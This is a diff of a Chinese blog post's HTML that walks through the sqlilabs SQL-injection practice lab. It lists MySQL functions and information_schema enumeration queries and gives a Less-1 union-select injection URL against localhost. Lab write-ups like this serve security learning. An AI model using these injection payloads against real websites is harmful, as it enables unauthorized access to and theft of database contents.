@@ -6,12 +6,12 @@
   
   <title>sqlilabs | Mkey的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="sqlilabs1234567891011121314151617181920212223# 常用系统函数1. version()——MySQL 版本2. user()——数据库用户名3. database()——数据库名4. @@datadir——数据库路径5. @@version_compile_os——操作系统版本# 字符串连接函数1. concat(str1,str2,...)——没有分隔">
+  <meta name="description" content="sqlilabs">
 <meta property="og:type" content="article">
 <meta property="og:title" content="sqlilabs">
 <meta property="og:url" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/index.html">
 <meta property="og:site_name" content="Mkey的博客">
-<meta property="og:description" content="sqlilabs1234567891011121314151617181920212223# 常用系统函数1. version()——MySQL 版本2. user()——数据库用户名3. database()——数据库名4. @@datadir——数据库路径5. @@version_compile_os——操作系统版本# 字符串连接函数1. concat(str1,str2,...)——没有分隔">
+<meta property="og:description" content="sqlilabs">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20210922110005139.png">
 <meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20210922110732132.png">
@@ -24,7 +24,7 @@
 <meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/image-20211120181312523.png">
 <meta property="og:image" content="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/%E6%88%AA%E5%B1%8F2021-11-21%20%E4%B8%8A%E5%8D%8810.39.45.png">
 <meta property="article:published_time" content="2021-10-31T16:00:00.000Z">
-<meta property="article:modified_time" content="2023-03-26T13:29:27.087Z">
+<meta property="article:modified_time" content="2023-07-24T08:25:14.276Z">
 <meta property="article:author" content="HOU">
 <meta property="article:tag" content="web-security">
 <meta name="twitter:card" content="summary">
@@ -107,7 +107,8 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <h1 id="sqlilabs"><a href="#sqlilabs" class="headerlink" title="sqlilabs"></a>sqlilabs</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 常用系统函数</span><br><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br><span class="line"></span><br><span class="line"># 字符串连接函数</span><br><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br><span class="line"></span><br><span class="line"># information_schema</span><br><span class="line">Mysql 有一个系统数据库information_schema，存储着所有的数据库的相关信息，一般的，</span><br><span class="line">我们利用该表可以进行一次完整的注入。</span><br><span class="line"></span><br><span class="line">猜数据库</span><br><span class="line">select schema_name from information_schema.schemata</span><br><span class="line">猜某库的数据表</span><br><span class="line">select table_name from information_schema.tables where table_schema=’xxxxx’</span><br><span class="line">猜某表的所有列</span><br><span class="line">Select column_name from information_schema.columns where table_name=’xxxxx’</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+        <h1 id="sqlilabs"><a href="#sqlilabs" class="headerlink" title="sqlilabs"></a>sqlilabs</h1><span id="more"></span>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># 常用系统函数</span><br><span class="line">1. version()——MySQL 版本</span><br><span class="line">2. user()——数据库用户名</span><br><span class="line">3. database()——数据库名</span><br><span class="line">4. @@datadir——数据库路径</span><br><span class="line">5. @@version_compile_os——操作系统版本</span><br><span class="line"></span><br><span class="line"># 字符串连接函数</span><br><span class="line">1. concat(str1,str2,...)——没有分隔符地连接字符串</span><br><span class="line">2. concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</span><br><span class="line">3. group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</span><br><span class="line"></span><br><span class="line"># information_schema</span><br><span class="line">Mysql 有一个系统数据库information_schema，存储着所有的数据库的相关信息，一般的，</span><br><span class="line">我们利用该表可以进行一次完整的注入。</span><br><span class="line"></span><br><span class="line">猜数据库</span><br><span class="line">select schema_name from information_schema.schemata</span><br><span class="line">猜某库的数据表</span><br><span class="line">select table_name from information_schema.tables where table_schema=’xxxxx’</span><br><span class="line">猜某表的所有列</span><br><span class="line">Select column_name from information_schema.columns where table_name=’xxxxx’</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
 <h2 id="less-1"><a href="#less-1" class="headerlink" title="less-1"></a>less-1</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">http://localhost/sqlilabs/Less-1/?id=1</span><br><span class="line">正常访问，首先判断注入类型，在1后添加‘测试发现报错</span><br><span class="line">near &#x27;&#x27;1&#x27;&#x27; LIMIT 0,1&#x27; at line 1</span><br><span class="line">可以发现1后面多了一个&#x27;，可以判断出注入类型为字符型，&#x27;&#x27;闭合。</span><br><span class="line"></span><br><span class="line">使用order by 判断 sql语句查询有3个对象</span><br><span class="line">使用联合查询：</span><br><span class="line">http://localhost/sqlilabs/Less-1/?id=-1%27%20union%20select%201,version(),user()%20--+</span><br></pre></td></tr></table></figure>
 
@@ -295,7 +296,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/" data-id="clkf9sao9001acwv5h0qm1vqd" data-title="sqlilabs" class="article-share-link">分享</a>
+      <a data-url="https://monkeyh0ck.github.io/2021/11/01/sqlilabs/" data-id="clko11m6a0016h8v50heec6vk" data-title="sqlilabs" class="article-share-link">分享</a>
       
       
       
@@ -307,11 +308,11 @@
     
 <nav id="article-nav">
   
-    <a href="/2021/11/01/SQLInject/" id="article-nav-newer" class="article-nav-link-wrap">
+    <a href="/2021/11/01/sqlInject_raoguo/" id="article-nav-newer" class="article-nav-link-wrap">
       <strong class="article-nav-caption">前一篇</strong>
       <div class="article-nav-title">
         
-          SQL注入
+          SQL注入绕过技巧
         
       </div>
     </a>
@@ -371,6 +372,10 @@
       <ul>
         
           <li>
+            <a href="/2023/07/29/BUUCTF-web-%E7%AC%AC%E5%9B%9B%E5%91%A8/">BUUCTF-web-第四周</a>
+          </li>
+        
+          <li>
             <a href="/2023/07/22/BUUCTF-web-%E7%AC%AC%E4%B8%89%E5%91%A8/">BUUCTF-web-第三周</a>
           </li>
         
@@ -380,10 +385,6 @@
         
           <li>
             <a href="/2023/07/09/BUUCTF-web-%E7%AC%AC%E4%B8%80%E5%91%A8/">BUUCTF-web-第一周</a>
-          </li>
-        
-          <li>
-            <a href="/2022/06/01/%E5%8F%8D%E5%BC%B9shell/">反弹shell</a>
           </li>
         
           <li>
